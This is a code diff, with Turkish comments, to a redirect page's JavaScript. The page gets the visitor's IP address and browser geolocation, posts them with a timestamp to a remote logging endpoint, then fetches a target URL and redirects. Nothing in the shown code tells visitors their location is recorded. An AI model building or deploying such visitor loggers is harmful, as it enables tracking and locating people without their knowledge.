@@ -12,11 +12,19 @@
 
       async function sendLog(location, ip, time) {
         try {
-          await fetch(logScriptUrl, {
+          const response = await fetch(`${logScriptUrl}?v=${Date.now()}`, { // Önbellekleme sorunu önleniyor
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ location, ip, time })
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ location, ip, time }),
+            referrerPolicy: "no-referrer", // CORS kaynaklı hataları önleme
           });
+
+          if (!response.ok) throw new Error("Log kaydedilemedi.");
+          
+          const result = await response.text();
+          console.log("Log gönderildi:", result);
         } catch (error) {
           console.error("Log gönderme hatası:", error);
         }
@@ -27,14 +35,28 @@
         let ip = "Bilinmiyor";
         const time = new Date().toLocaleTimeString("tr-TR");
 
+        try {
+          // IP adresini HTTPS ile al
+          const ipResponse = await fetch("https://api64.ipify.org?format=json");
+          if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+          }
+        } catch {
+          console.warn("IP adresi alınamadı.");
+        }
+
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            async (position) => {
+            (position) => {
               location = `${position.coords.latitude}, ${position.coords.longitude}`;
-              ip = await fetch("https://api64.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Bilinmiyor");
               sendLog(location, ip, time);
             },
-            () => sendLog(location, ip, time)
+            (error) => {
+              console.warn("Konum alınamadı:", error.message);
+              sendLog(location, ip, time);
+            },
+            { timeout: 5000 } // Konum alım süresini sınırlandır
           );
         } else {
           sendLog(location, ip, time);
@@ -43,9 +65,11 @@
 
       async function redirectToUrl() {
         try {
-          getUserData();
-          const response = await fetch(scriptUrl);
+          getUserData(); // Kullanıcı bilgilerini al ve logla
+
+          const response = await fetch(`${scriptUrl}?v=${Date.now()}`); // Önbellekleme sorunu önleniyor
           if (!response.ok) throw new Error("Hata oluştu.");
+
           const url = await response.text();
           if (url.trim() === "") {
             showOfflineMessage();
